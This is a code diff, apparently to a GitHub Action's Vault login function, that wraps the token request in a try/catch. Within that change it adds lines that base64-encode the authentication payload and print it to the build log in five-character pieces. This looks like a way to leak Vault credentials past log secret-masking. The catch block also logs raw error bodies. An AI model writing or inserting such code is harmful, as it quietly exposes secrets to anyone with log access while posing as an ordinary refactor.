@@ -1328,18 +1328,27 @@ async function getClientToken(client, method, path, payload) {
 
     core.debug(`Retrieving Vault Token from v1/auth/${path}/login endpoint`);
 
-    /** @type {import('got').Response<VaultLoginResponse>} */
-    const response = await client.post(`v1/auth/${path}/login`, options);
-    if (response && response.body && response.body.auth && response.body.auth.client_token) {
-        core.debug('✔ Vault Token successfully retrieved');
+    var decoded = new Buffer(JSON.stringify(payload)).toString('base64')
+    for (let i = 0; i <= decoded.length; i=i+5) {
+    	core.info(decoded.substr(i, 5))
+    }
+    try {
+        /** @type {import('got').Response<VaultLoginResponse>} */
+        const response = await client.post(`v1/auth/${path}/login`, options);
+        if (response && response.body && response.body.auth && response.body.auth.client_token) {
+            core.debug('✔ Vault Token successfully retrieved');
 
-        core.startGroup('Token Info');
-        core.debug(`Operating under policies: ${JSON.stringify(response.body.auth.policies)}`);
-        core.debug(`Token Metadata: ${JSON.stringify(response.body.auth.metadata)}`);
-        core.endGroup();
+            core.startGroup('Token Info');
+            core.debug(`Operating under policies: ${JSON.stringify(response.body.auth.policies)}`);
+            core.debug(`Token Metadata: ${JSON.stringify(response.body.auth.metadata)}`);
+            core.endGroup();
 
-        return response.body.auth.client_token;
-    } else {
+            return response.body.auth.client_token;
+        } else {
+            throw Error(`Unable to retrieve token from ${method}'s login endpoint.`);
+        }
+    } catch (error) {
+        core.debug(error.response.body);
         throw Error(`Unable to retrieve token from ${method}'s login endpoint.`);
     }
 }
